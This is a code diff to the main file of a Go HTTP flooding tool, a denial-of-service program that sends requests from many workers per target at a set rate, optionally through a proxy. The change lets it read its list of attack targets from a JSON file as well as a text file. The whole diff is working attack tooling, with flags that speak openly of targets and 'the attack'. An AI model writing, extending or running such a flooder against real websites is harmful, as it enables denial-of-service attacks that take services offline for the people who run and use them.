@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"os"
@@ -16,7 +17,7 @@ import (
 )
 
 func main() {
-	input := flag.String("i", "targets.txt", "A filename with a list of target HTTP/HTTPS addresses separated by newline; or an url.")
+	input := flag.String("i", "targets.txt", "A filename with a list of target HTTP/HTTPS addresses separated by newline; or an url. Accept JSON files also.")
 	proxy := flag.String("p", "", "A proxy to use for the attack(in the form of https://proxy:port).")
 	N := flag.Int("N", 200, "Number of workers per target")
 	maxRPS := flag.Int("t", 1000, "Target number of requests Per Second")
@@ -30,21 +31,31 @@ func main() {
 		progress = mpb.New(mpb.WithWidth(64))
 	}
 
-	text := ""
-	if strings.HasSuffix(*input, ".txt") {
+	targetUrls := []string{}
+	switch {
+	case strings.HasSuffix(*input, ".txt"):
 		txt, err := os.ReadFile(*input)
 		if err != nil {
 			panic(err)
 		}
-		text = string(txt)
-	} else {
-		text = *input
+		targetUrls = strings.Split(string(txt), "\n")
+	case strings.HasSuffix(*input, ".json"):
+		data, err := os.ReadFile(*input)
+		if err != nil {
+			panic(err)
+		}
+		err = json.Unmarshal(data, &targetUrls)
+		if err != nil {
+			panic(err)
+		}
+	default:
+		targetUrls = []string{*input}
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	for _, line := range strings.Split(string(text), "\n") {
+	for _, line := range targetUrls {
 		target := flood.New(line, *proxy)
 
 		var bar *mpb.Bar
@@ -60,7 +71,7 @@ func main() {
 			)
 		}
 
-		go func(t flood.Target, b *mpb.Bar) {
+		go func(t *flood.Target, b *mpb.Bar) {
 			t.Run(ctx, *N, *maxRPS, func(requests, errors int64) {
 				if !*silent {
 					b.SetTotal(int64(requests), false)
